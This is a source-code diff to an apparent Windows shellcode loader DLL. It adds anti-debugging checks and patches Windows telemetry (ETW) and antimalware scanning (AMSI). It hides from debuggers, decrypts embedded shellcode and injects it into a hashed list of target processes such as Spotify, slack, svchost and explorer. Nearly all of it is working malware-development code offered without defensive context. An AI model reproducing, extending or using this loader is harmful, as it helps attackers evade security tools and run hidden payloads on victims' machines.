@@ -17,6 +17,16 @@ VOID entry(void)
 
 #pragma region Evasion
 
+#if ANTI_DEBUG_ENABLED
+
+	while (malapi::IsDebuggerPresent())
+	{
+		LOG_ERROR("Currently being debugged. Sleeping...");
+		SleepMethod(SLEEP_TIME);
+	}
+
+#endif
+
 #if ANTI_SANDBOX_ENABLED
 	SleepMethod(SLEEP_TIME);
 #else
@@ -27,11 +37,23 @@ VOID entry(void)
 	//#endif
 
 #if PATCH_ENABLED_ETW
-	PatchEtw();
+
+#if PATCH_METHOD_ETW == 1
+	malapi::PatchEtwSsn();
+#else
+	malapi::PatchEtwEventWrite();
+#endif
+
 #else
 #endif
 
-#if PATCH_METHOD_AMSI
+#if PATCH_ENABLED_AMSI
+
+#if PATCH_METHOD_AMSI == 1
+	malapi::PatchAmsiScanBuffer();
+#else
+#endif
+
 #else
 #endif
 
@@ -59,11 +81,6 @@ VOID entry(void)
 #if CONFIG_CREATE_PROCESS_METHOD == 1
 	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;
 	malapi::CreateSuspendedProcess((LPSTR)CONFIG_SACRIFICIAL_PROCESS, &process_handle, &additional_handle);
-	malapi::HideFromDebugger(additional_handle);
-
-	SleepMethod(SLEEP_TIME);
-
-	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));
 
 #elif CONFIG_CREATE_PROCESS_METHOD == 2
 	//
@@ -81,8 +98,8 @@ VOID entry(void)
 
 #else
 	constexpr ULONG targets[] = {
-		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"), // dev win 10
-		malapi::HashStringFowlerNollVoVariant1a("Notepad.exe"), // dev win 11
+		//malapi::HashStringFowlerNollVoVariant1a("notepad.exe"), // dev win 10
+		//malapi::HashStringFowlerNollVoVariant1a("Notepad.exe"), // dev win 11
 		malapi::HashStringFowlerNollVoVariant1a("Spotify.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("slack.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("PerfWatson2.exe"),
@@ -96,6 +113,7 @@ VOID entry(void)
 		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("devenv.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("cloudflared.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("svchost.exe"), // if all else fails
 		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"), // if all else fails
 	};
 
@@ -114,11 +132,28 @@ VOID entry(void)
 	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));
 
 #endif
+
+#if ANTI_DEBUG_ENABLED
+
+	malapi::HideFromDebugger(additional_handle);
 	malapi::HideFromDebugger(process_handle);
+
+	while (malapi::IsRemoteDebuggerPresent(process_handle))
+	{
+		LOG_ERROR("Currently being debugged remotely. Sleeping...");
+		SleepMethod(SLEEP_TIME);
+	}
+
+#endif
+
+	SleepMethod(SLEEP_TIME);
+
+	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));
 
 	if (!ExecuteShellcode(process_handle, shellcode, shellcode_size, additional_handle))
 	{
 		LOG_ERROR("Failed to execute shellcode.");
+		return;
 	}
 	LOG_SUCCESS("Executing Shellcode");
 }
@@ -143,6 +178,8 @@ BOOL APIENTRY WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvRese
 		break;
 	}
 
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
 	case DLL_PROCESS_DETACH:
 	{
 		if (lpvReserved != nullptr)
